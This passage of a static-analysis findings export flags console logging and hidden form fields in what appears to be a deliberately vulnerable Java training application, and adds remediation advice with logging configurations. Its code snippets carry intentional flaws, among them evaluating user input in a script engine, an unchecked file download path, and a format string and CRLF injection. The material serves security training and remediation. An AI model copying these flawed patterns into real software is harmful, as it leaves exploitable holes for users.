org.apache.log4j.PatternLayout\nlog4j.appender.file.layout.ConversionPattern = %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n\t\n\nweb.xml //if the file is specified in classpath, below configuration is not reqd\n&lt;context-param&gt;\n        &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/log4j.properties&lt;/param-value&gt;\n   &lt;/context-param&gt;\n\n\t &lt;listener&gt;\n        &lt;listener-class&gt;org.springframework.web.util.Log4jConfigListener&lt;/listener-class&gt;\n    &lt;/listener&gt;", "frontend": "N/A", "comments": "Configure the proper log level in production.\n\nAdd protections to log files (e.g., access restriction). Prefer to send log information to a logging system (e.g., rsyslog)"}, {"system": "Web Server / Tomcat", "configuration": "web.xml\n\n   &lt;context-param&gt;\n        &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/log4j.properties&lt;/param-value&gt;\n   &lt;/context-param&gt;\n\n-- log4j.properties will be fetched automatically, if placed in classpath, otherwise above configuration mentioning log4j.properties location is necessary", "backend": "log4j.properties //new property file added to enable log4j logger\n# Root logger option\nlog4j.rootLogger = DEBUG, file\n\n# Redirect log messages to a log file\nlog4j.appender.file = org.apache.log4j.RollingFileAppender\n#outputs to Tomcat home\nlog4j.appender.file.File = ${catalina.home}/logs/mysecapp.log\nlog4j.appender.file.MaxFileSize = 5MB\nlog4j.appender.file.MaxBackupIndex = 10\nlog4j.appender.file.layout = org.apache.log4j.PatternLayout\nlog4j.appender.file.layout.ConversionPattern = %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n\t\n\nweb.xml //if the file is specified in classpath, below configuration is not reqd\n&lt;context-param&gt;\n        &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/log4j.properties&lt;/param-value&gt;\n   &lt;/context-param&gt;\n\n\t &lt;listener&gt;\n        &lt;listener-class&gt;org.springframework.web.util.Log4jConfigListener&lt;/listener-class&gt;\n    &lt;/listener&gt;", "frontend": "N/A", "comments": "Configure the proper log level in production.\n\nAdd protections to log files (e.g., access restriction). Prefer to send log information to a logging system (e.g., rsyslog)"}]}}}}, "Poor Logging Practice: Use of a System Output Stream": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00084", "function": "FunctionCall: println()", "line": "278", "snippet": "//Vul 135 - misleading method signature\n\t\t\tboolean equal = user1.equals(user2,user1);\n\t\t\tSystem.out.println(\"value\"+equal);\n\t\t\t\n\t\t\tPerson per = new Person();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00085", "function": "FunctionCall: println()", "line": "543", "snippet": "cipher.init(Cipher.DECRYPT_MODE, privateKey);\n\t\t\tbyte[] decodedByte = Base64.getDecoder().decode(encryptedText);\n\t\t\tSystem.out.println(\"decodedByte1---\"+decodedByte);\n\t\t\tdecodedByte = cipher.doFinal(decodedByte);\n\t\t\tSystem.out.println(\"decodedByte2---\"+decodedByte);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00086", "function": "FunctionCall: println()", "line": "603", "snippet": "String path = System.getProperty(\"user.dir\") + \"\\\\EmployeeInfo.xsd\";\n\t        \n\t        System.out.println(\"Working Directory = \" + path);\n\t\t\t\n\t\t\t  SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00087", "function": "FunctionCall: println()", "line": "915", "snippet": "// Send message\n\t         Transport.send(mimemessage);\n\t         System.out.println(\"Sent message successfully....\");\n\t      } catch (MessagingException mex) {\n\t         mex.printStackTrace();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00088", "function": "FunctionCall: println()", "line": "596", "snippet": "public ModelAndView validateEmployee(@RequestParam(\"file\") MultipartFile file) throws IOException, ParserConfigurationException, SAXException { // process your\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// file\n\t\tSystem.out.println(\"ModelAndView --- upload\");\n\n\t\tModelAndView mv = new ModelAndView();"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00089", "function": "FunctionCall: println()", "line": "61", "snippet": "String strDate = dateFormat.format(new Date());\n    \t\tSystem.out.println(\"String Date\"+strDate);\n \n            RequestDispatcher dispatcher"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00090", "function": "FunctionCall: println()", "line": "801", "snippet": "break;\n\t\t\t\t\t}\n\t\t\t\t\tSystem.out.println(line);\n\t\t\t\t\tdirList.add(line);\n\t\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00091", "function": "FunctionCall: println()", "line": "286", "snippet": "String height = (String) field.get(per);\n\t        System.out.println(\"Height\"+height);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00092", "function": "FunctionCall: println()", "line": "992", "snippet": "NodeList nodes = (NodeList)this.xpath.evaluate(\"Id\", doc, XPathConstants.NODESET);\n            System.out.println(\"Name\"+namever);\n            System.out.println(\"nodes\"+nodes);\n            mv.setViewName(\"uploadFile\");\n            String msg = \"Employee name is \"+name;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00093", "function": "FunctionCall: println()", "line": "545", "snippet": "System.out.println(\"decodedByte1---\"+decodedByte);\n\t\t\tdecodedByte = cipher.doFinal(decodedByte);\n\t\t\tSystem.out.println(\"decodedByte2---\"+decodedByte);\n\t\t\tString decryptedTxt = new String(decodedByte);\n\t\t\tSystem.out.println(\"decryptedTxt---\"+decryptedTxt);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00094", "function": "FunctionCall: println()", "line": "304", "snippet": "if(!dir.exists()) {\n\t\t                \tif(dir.mkdir()) {\n\t\t                \t\tSystem.out.println(\"Directory created\");\n\t\t                \t}\n\t\t                }"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00095", "function": "FunctionCall: println()", "line": "1160", "snippet": "System.out.println(\"GET Response Status:: \"\n\t\t\t\t+ httpResponse.getStatusLine().getStatusCode());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00096", "function": "FunctionCall: format()", "line": "188", "snippet": "session.setAttribute(\"color\", value);\n\t    response.addCookie(new Cookie(\"color\", value)); //cwe 312 Cleartext Storage of Sensitive Information ->Improper Neutralization of CRLF Sequences in HTTP Headers, Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\t    System.out.format(value); //CWE134_Uncontrolled_Format_String\n\t    \n\t    logger.info(\"CRLF injection veracode CWE 93\"+value); //CRLF Injection -> Improper Output Neutralization for Logs"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00097", "function": "FunctionCall: println()", "line": "547", "snippet": "System.out.println(\"decodedByte2---\"+decodedByte);\n\t\t\tString decryptedTxt = new String(decodedByte);\n\t\t\tSystem.out.println(\"decryptedTxt---\"+decryptedTxt);\n\n\t\t} catch (NoSuchAlgorithmException e) {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00098", "function": "FunctionCall: println()", "line": "862", "snippet": "mv.addObject(\"msg\", \"File deleted successfully.\");\n\t\t\t} else {\n\t\t\t\tSystem.out.println(\"Failed to delete the file\");\n\t\t\t\tmv.setViewName(\"commandExec\");\n\t\t\t\tmv.addObject(\"msg\", \"Failed to delete the file\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00099", "function": "FunctionCall: println()", "line": "317", "snippet": "}\n\t\t else {\n\t\t     System.out.println(\"FALSE\");\n\t\t }\n\t\tif(userProfile.getUserName()!=null) {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00100", "function": "FunctionCall: println()", "line": "1175", "snippet": "// print result\n\t\tSystem.out.println(response.toString());\n\t\tmv.setViewName(\"displayDetails\");\n        mv.addObject(\"msg\", response.toString());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00101", "function": "FunctionCall: println()", "line": "180", "snippet": "public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(\"pwd\"))) {\n                    System.out.println(\"Decrypted chars\"+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00102", "function": "FunctionCall: println()", "line": "314", "snippet": "String isValid = \"true\";\n\t\t if ( Boolean.getBoolean(isValid) ) {\n\t\t     System.out.println(\"TRUE\");\n\t\t }\n\t\t else {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00103", "function": "FunctionCall: println()", "line": "956", "snippet": "ScriptEngineManager manager = new ScriptEngineManager();\n\t\tScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n\t\tSystem.out.println(engine.eval(exp));\n\t\tObject result = engine.eval(exp);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00104", "function": "FunctionCall: println()", "line": "844", "snippet": "for(String allowedPath : allowedFilePaths) {\n\t\t\t\t\t if(filepath.startsWith(allowedPath)) {\n\t\t\t\t\t\t System.out.println(\"Continue application logic here\");\n\t\t\t\t\t }\n\t\t\t\t }"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00105", "function": "FunctionCall: println()", "line": "991", "snippet": "String namever = this.xpath.evaluate(\"Id\",doc);\n            NodeList nodes = (NodeList)this.xpath.evaluate(\"Id\", doc, XPathConstants.NODESET);\n            System.out.println(\"Name\"+namever);\n            System.out.println(\"nodes\"+nodes);\n            mv.setViewName(\"uploadFile\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00106", "function": "FunctionCall: println()", "line": "153", "snippet": "userAccounts.setUserAccounts(listUsers);\n\t\tString strDate = dateFormat.format(new Date());\n\t\tSystem.out.println(\"String Date\"+strDate);\n\t\t\n\t\treturn new ModelAndView(\"listUser\",\"listUsersBean\",userAccounts);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00107", "function": "FunctionCall: println()", "line": "728", "snippet": "break;\n\t\t\t\t\t}\n\t\t\t\t\tSystem.out.println(line);\n\t\t\t\t\tdirList.add(line);\n\t\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00108", "function": "FunctionCall: println()", "line": "766", "snippet": "Matcher interruptableMatcher = pattern.matcher(new InterruptibleCharSequence(cmd));\n\t            interruptableMatcher.find(); // runs for a long time!\n\t            System.out.println(\"Regex took:\" + (System.currentTimeMillis() - startTime) + \"ms\");\n\t         }\n\t      };"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00109", "function": "FunctionCall: println()", "line": "857", "snippet": "if (isfileNameValid) {\n\t\t\t\tfile.delete();\n\t\t\t\tSystem.out.println(\"File deleted successfully\");\n\t\t\t\t//mv = executeCommand(\"dir\");\n\t\t\t\tmv.setViewName(\"commandExec\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00110", "function": "FunctionCall: println()", "line": "238", "snippet": "String name = file.getOriginalFilename();\n\t\t\tString extension = FilenameUtils.getExtension(file.getOriginalFilename());\n\t\t\tSystem.out.println(\"extension\"+extension);\n\t\t\tString rootPath = System.getProperty(\"catalina.home\");"}]}], "remediation": {"remediation": {"@id": "R.0018", "@name": "Poor Logging Practice: Use of a System Output Stream", "@dateLastModified": "8/21/2020", "faqs": {"faq": {"question": "Why is this a security issue?", "answer": "Console messages are hard to be monitored by security tools (SIEM), are not protected form operational people to read, and may contain other protected information (IP, application parameters, server configuration, etc.). The console messages are more vulnerable to attacks (any program can send messages to console that will mess up or override the application message)."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult IPChecker(string txtIP)\n        {\n            using (Process process = new Process())\n            {\n                try\n                {\n                    IPAddress ip = null;\n                    if (IPAddress.TryParse(txtIP.ToString(), out ip)){\n                        Ping png = new Ping();\n                        PingReply rep = png.Send(ip);\n                        ViewData[&quot;PingResponse&quot;] = &quot;Ping to &quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;[&quot; + rep.Address.ToString() + &quot;]&quot; + &quot; Successful&quot; +\n                                                   &quot; Response delay = &quot; + rep.RoundtripTime.ToString() + &quot; ms&quot;;\n                    }\n                    else\n                    {\n                        ViewData[&quot;PingResponse&quot;] = &quot;Invalid IP [&quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;]&quot;;\n                    }\n                }\n                catch (ArgumentException adEx)\n                {\n                    ViewData[&quot;ErrorMessage&quot;] = adEx.Message.ToString();\n                   <em class=\"red\"> Console.WriteLine(&quot;ArgumentException was thrown.&quot; + adEx.Message);</em>\n                }\n                catch (Exception ex)\n                {\n                    ViewData[&quot;PingResponse&quot;] = ex.Message;\n                    <em class=\"red\">Console.WriteLine(&quot;An Exception was thrown.&quot; + ex.Message);</em>\n                }\n            }\n            return View();\n        }", "nonvulncode": "public ActionResult IPChecker(string txtIP)\n        {\n            using (Process process = new Process())\n            {\n                try\n                {\n                    IPAddress ip = null;\n                    if (IPAddress.TryParse(txtIP.ToString(), out ip)){\n                        Ping png = new Ping();\n                        PingReply rep = png.Send(ip);\n                        ViewData[&quot;PingResponse&quot;] = &quot;Ping to &quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;[&quot; + rep.Address.ToString() + &quot;]&quot; + &quot; Successful&quot; +\n                                                   &quot; Response delay = &quot; + rep.RoundtripTime.ToString() + &quot; ms&quot;;\n                    }\n                    else\n                    {\n                        ViewData[&quot;PingResponse&quot;] = &quot;Invalid IP [&quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;]&quot;;\n                    }\n                }\n                catch (ArgumentException adEx)\n                {\n                    ViewData[&quot;ErrorMessage&quot;] = adEx.Message.ToString();\n                   <em class=\"blue\">logger.Error(&quot;ArgumentException encountered: &quot; + adEx.Message);</em>\n                }\n                catch (Exception ex)\n                {\n                    ViewData[&quot;PingResponse&quot;] = ex.Message;\n                   <em class=\"blue\">logger.Error(&quot;Exception encountered: &quot; + ex.Message);</em>\n                }\n            }\n            return View();\n        }", "comments": "Use logging framework (like Nlog, or Log4Net ) to capture any exception or message that application may need to log instead of using Console.Writeline. \nConsole.Writeline may be used for live troubleshooting on console application, but needs to be removed when troubleshooting is over. It is not recommended to web applications due to the way console is handled by the web server.\nWhen using a logger, it is much easier to enable logging by changing the &quot;loglevel&quot; property on the classes.", "impact": "Add the logger as a reference\nConfigure the logger settings (LogLevel) per class and generic.\nReplace all console messages for a logger message.", "abstract": "By using logger (Nlog)"}, {"@type": "JAVA/JSP", "vulncode": "EmployeeController c<em class=\"bold\">lass</em>\n<em class=\"red\">private final Logger logger = LoggerFactory.getLogger(EmployeeController.class); // logger not provided as static</em>\npublic void downloadFile( @RequestParam(value=&quot;file&quot;)String name,HttpSession session,HttpServletResponse response) throws Exception {\n<em class=\"red\">System.out.println(&quot;Inside download file execution&quot;);</em>\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;);\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t \n\t       <em class=\"red\">System.out.println(&quot;Error dowloading file&quot;);</em>\n\t    }\n\n\t}", "nonvulncode": "EmployeeController c<em class=\"bold\">lass</em>\n<em class=\"blue\">private static final Logger logger = LoggerFactory.getLogger(EmployeeController.class);</em>\npublic void downloadFile( @RequestParam(value=&quot;file&quot;)String name,HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n<em class=\"blue\">logger.info(&quot;Inside download File&quot;);</em>\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;);\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t \n\t    \t<em class=\"blue\">logger.error(&quot;Error in executing command, contact support team, case number 36313&quot;);</em>\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in executing command, check log for more information&quot;);\n\t    }\n\n\t}", "comments": "While using println is not recommended on production: println acquires locks so that message on the console is not mixed with other messages, which causes the program to wait until println is finished; println is not structured. \n\nMethods like &quot;printf&quot; or &quot;println&quot; may be used for live troubleshooting on console application, but needs to be removed when troubleshooting is over. It is not recommended to web applications due to the way console is handled by the web server.\n\nUsing a logger is \n1) structured (by using appenders): can define the layout, timestamp, rotation, etc. \n2) Possible to set different log levels: within the same class, we can use different level and get the information logged accordingly with ease. (For production, we can set the logger level to WARN, which logs only during harmful situation). When using a logger, it is much easier to enable logging by changing the &quot;loglevel&quot; property on the classes.\n\nIt is suggested to use, a logger (e.g., Single logger, log4j, etc.) object between all of the instances of a particular class. The Logger should be declared static final.", "impact": "Add the logger as a reference\nConfigure the logger settings (LogLevel) per class and generic.\nReplace all console messages for a logger message.", "abstract": "By using logger (log4j)"}]}, "mitigations": {"mitigation": [{"system": "Web Server / IIS", "configuration": "Web.config\nIIS Manager interface", "backend": "Nlog (Web.config):\n\nWeb.config\n&lt;nlog xmlns=&quot;http://www.nlog-project.org/schemas/NLog.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;\n    &lt;targets&gt;\n      &lt;target name=&quot;default&quot; xsi:type=&quot;File&quot;\n      fileName=&quot;logs/app-log.txt&quot;\n      archiveFileName=&quot;logs/archives/app-log.{#}.txt&quot;\n      archiveEvery=&quot;Day&quot;\n      archiveNumbering=&quot;Rolling&quot;\n      maxArchiveFiles=&quot;7&quot; /&gt;\n    &lt;/targets&gt;\n    &lt;rules&gt;\n      &lt;logger name=&quot;*&quot; minlevel=&quot;Debug&quot; maxlevel=&quot;Error&quot; writeTo=&quot;default&quot; /&gt;\n    &lt;/rules&gt;\n  &lt;/nlog&gt;\n\n\nHTTP Logging(IIS Manager interface) :\n\n1.Open Internet Information Services (IIS) Manager.\n2.In the Connections pane, expand the server name, expand Sites, and then navigate to the Web site or application for which you want to configure HTTP logging.\n3.In the Home pane, double-click Logging.\n4.In the Actions pane, click Enable to enable logging.\n5.Select the log file format you want to use for your site or application in the Format drop-down list, and, if you want to change the default location where IIS stores log files, type the path where you want to store the log files for the site or application in the Directory box.\n6.(Optional) If you selected W3C in the Format drop-down list in step 5, click Select Fields.\n7.(Optional) In the W3C Logging Fields dialog box, select the W3C fields you want to log, clear any W3C fields you do not want to log, and then click OK.\n8.In the Actions pane, click Apply.", "frontend": "LogEntry logEntry = new LogEntry();\nlogEntry.Priority = 2;\nlogEntry.Categories.Add(&quot;Trace&quot;);\nlogEntry.Categories.Add(&quot;UI Events&quot;);\n\nif (myLogWriter.ShouldLog(logEntry))\n{\n  // Event will be logged according to current configuration. Perform operations (possibly\n  // expensive) to gather additional information for the event to be logged. \n}\nelse\n{\n  // Event will not be logged. Your application can avoid the performance\n  // penalty of collecting information for an event that will not be logged.\n}\n\nRefernce : https://docs.microsoft.com/en-us/previous-versions/msp-n-p/ff664418(v=pandp.50)?redirectedfrom=MSDN", "comments": "There are many logging tools that can be configured on IIS, and below are provided 2 examples (NLog and IIS default logging)\nAll logs must be send to the SIEM tool: a central logs repository, with correlations and security events monitored. Talk to the central security to align the application specific SIEM use cases.\n\nNLog\nNLog will only produce output if having configured one (or more) NLog targets. NLog can be configured using XML by adding a NLog.config, that will be described in the page.\n\nOn the NLog.config file, set the proper log level: (e.g., &lt;variable name='globalLevel' value='debug'/&gt; )\nThe following log levels are supported.\n  - Fatal\n  - Error\n  - Warn\n  - Info\n  - Debug\n  - Trace\n \nmore information: https://github.com/nlog/NLog/wiki/Configuration-file\n\nHTTP Logging(IIS Manager interface) :\nThe &lt;httpLogging&gt; element allows you to configure IIS to generate log entries for only successful requests, failed requests, or both. After you configure logging for each Web site at the server level, you can use this element to enable selective logging for individual URLs. By default, HTTP logging is enabled for all requests on Internet Information Services (IIS) .\n\nReference:\n1. https://docs.microsoft.com/en-us/iis/configuration/system.webserver/httplogging#:~:text=In%20the%20Connections%20pane%2C%20expand,click%20Enable%20to%20enable%20logging.\n2. https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis\n3.https://www.finalanalytics.com/blog/configure-http-logging-in-iis\n4. https://docs.microsoft.com/en-us/iis/extensions/advanced-logging-module/advanced-logging-for-iis-custom-logging"}, {"system": "Web Server / Tomcat", "configuration": "web.xml\n\n   &lt;context-param&gt;\n        &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/log4j.properties&lt;/param-value&gt;\n   &lt;/context-param&gt;\n\n-- log4j.properties will be fetched automatically, if placed in classpath, otherwise above configuration mentioning log4j.properties location is necessary", "backend": "log4j.properties //new property file added to enable log4j logger\n# Root logger option\nlog4j.rootLogger = DEBUG, file\n\n# Redirect log messages to a log file\nlog4j.appender.file = org.apache.log4j.RollingFileAppender\n#outputs to Tomcat home\nlog4j.appender.file.File = ${catalina.home}/logs/mysecapp.log\nlog4j.appender.file.MaxFileSize = 5MB\nlog4j.appender.file.MaxBackupIndex = 10\nlog4j.appender.file.layout = org.apache.log4j.PatternLayout\nlog4j.appender.file.layout.ConversionPattern = %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n\t\n\nweb.xml //if the file is specified in classpath, below configuration is not reqd\n&lt;context-param&gt;\n        &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/log4j.properties&lt;/param-value&gt;\n   &lt;/context-param&gt;\n\n\t &lt;listener&gt;\n        &lt;listener-class&gt;org.springframework.web.util.Log4jConfigListener&lt;/listener-class&gt;\n    &lt;/listener&gt;", "frontend": "N/A", "comments": "Configure the proper log level in production.\n\nAdd protections to log files (e.g., access restriction). Prefer to send log information to a logging system (e.g., rsyslog)"}]}}}}, "Hidden Field": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/jspViews/sendEmail.jsp", "items": [{"id": "IN00111", "function": "null()", "line": "33", "snippet": "<br>\n<form:form action=\"sendEmail.html\" method=\"post\" modelAttribute=\"mailObject\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<table align=\"center\">\n        <tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/commandExec.jsp", "items": [{"id": "IN00112", "function": "null()", "line": "62", "snippet": "<form id=\"personForm\" action=\"class.html\" method=\"POST\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n\t<p style=\"color:blue;font-size:12px;\">Enter class name eg. EmployeeDAOImpl</p>\n    <input id=\"exp\" type=\"text\" name=\"className\" />"}]}, {"file": "WebContent/WEB-INF/jspViews/addUserProfile.jsp", "items": [{"id": "IN00113", "function": "null()", "line": "22", "snippet": "<form:form action=\"addUserProfile.html\" method=\"post\" modelAttribute=\"userProfile\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<table align=\"center\">\n        <tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00114", "function": "null()", "line": "33", "snippet": "<form id=\"uploademployeeForm\" action=\"uploademployee.html\" method=\"POST\" enctype=\"multipart/form-data\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <label for=\"file\">File</label>\n    <input id=\"file\" type=\"file\" name=\"file\" />"}]}, {"file": "WebContent/WEB-INF/jspViews/commandExec.jsp", "items": [{"id": "IN00115", "function": "null()", "line": "24", "snippet": "<form action=\"deleteFile.html\" method=\"post\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<h2 align=\"center\">Deleting file</h2>   \n<input id=\"file\" type=\"text\" name=\"fileName\" /> <button type=\"submit\" value=\"Delete\">Delete</button>"}]}, {"file": "WebContent/WEB-INF/jspViews/commandExec.jsp", "items": [{"id": "IN00116", "function": "null()", "line": "55", "snippet": "<form id=\"evaluateForm\" action=\"eval.html\" method=\"POST\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n\t<p style=\"color:blue;font-size:12px;\">Enter expression to be evaluate eg. 2+2</p>\n    <input id=\"exp\" type=\"text\" name=\"exp\" />"}]}, {"file": "WebContent/WEB-INF/jspViews/calculateStudentBMI.jsp", "items": [{"id": "IN00117", "function": "null()", "line": "11", "snippet": "<body>\n<form name=\"bmiForm\" action=\"calculateServlet\" method=\"POST\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <table>\n        <tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00118", "function": "null()", "line": "64", "snippet": "<form id=\"createxmlForm\" action=\"creatxml.html\" method=\"POST\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n     <p><button type=\"submit\" class=\"btn\">Create XML</button></p>       \n</form>"}]}, {"file": "WebContent/WEB-INF/jspViews/addUserProfileJSON.jsp", "items": [{"id": "IN00119", "function": "null()", "line": "22", "snippet": "<form:form action=\"addUserDataFromJson.html\" method=\"post\" modelAttribute=\"userProfile\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<table align=\"center\">\n        <tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00120", "function": "null()", "line": "58", "snippet": "<form id=\"getEmployeeName\" action=\"getEmployeeName.html?param1=empID\" method=\"GET\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <input id=\"empID\" type=\"text\" name=\"empID\" />\n    <p><button type=\"submit\" class=\"btn\">Employee Detail</button></p>"}]}, {"file": "WebContent/WEB-INF/jspViews/evaluate.jsp", "items": [{"id": "IN00121", "function": "null()", "line": "26", "snippet": "<form id=\"evaluateForm\" action=\"eval.html\" method=\"POST\">\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <input id=\"exp\" type=\"text\" name=\"exp\" />\n    <p><button type=\"submit\" class=\"btn\">Evaluate</button></p>"}]}, {"file": "WebContent/WEB-INF/jspViews/success.jsp", "items": [{"id": "IN00122", "function": "null()", "line": "35", "snippet": "</script>\nWelcome ${loginBean.userName} <br> <br> <br>\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<a href=\"logout.html\">Logout</a> <br>"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00123", "function": "null()", "line": "52", "snippet": "<form id=\"downloadCSVForm\" action=\"createCSVFile.html?param1=name\" method=\"GET\">\n<p style=\"color:blue;font-size:12px;\">Provide employee name to retrieve details in CSV file</p>\n\t<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <input id=\"name\" type=\"text\" name=\"name\" />\n    <p><button type=\"submit\" class=\"btn\">CSV Download</button></p>"}]}, {"file": "WebContent/WEB-INF/jspViews/commandExec.jsp", "items": [{"id": "IN00124", "function": "null()", "line": "30", "snippet": "<form action=\"execCmd.html\" method=\"POST\">\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n<br>\n<br>"}]}, {"file": "WebContent/WEB-INF/jspViews/listUser.jsp", "items": [{"id": "IN00125", "function": "null()", "line": "16", "snippet": "<div class=\"column\" float=\"right\" width=\"100px\"> <a href=\"loadIndex.html?color=white\">Back</a></div>\n</div>\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <div align=\"center\">\n        <table>"}]}, {"file": "WebContent/WEB-INF/jspViews/login.jsp", "items": [{"id": "IN00126", "function": "null()", "line": "24", "snippet": "<td>Password :</td> <td><input type=\"password\" name=\"pwd\"></td><br>\n        </tr>\n        <tr><input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" /></tr>\n        <tr>\n         <td><center><input type=\"submit\" value=\"Submit\" name=\"button\" class=\"btn\"></center></td>"}]}, {"file": "WebContent/WEB-INF/jspViews/listStudentGrade.jsp", "items": [{"id": "IN00127", "function": "null()", "line": "18", "snippet": "<th><c:out value=\"${msg}\" /></th>\n</div>\n<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n\t<table>\n\t\t<tr>"}]}, {"file": 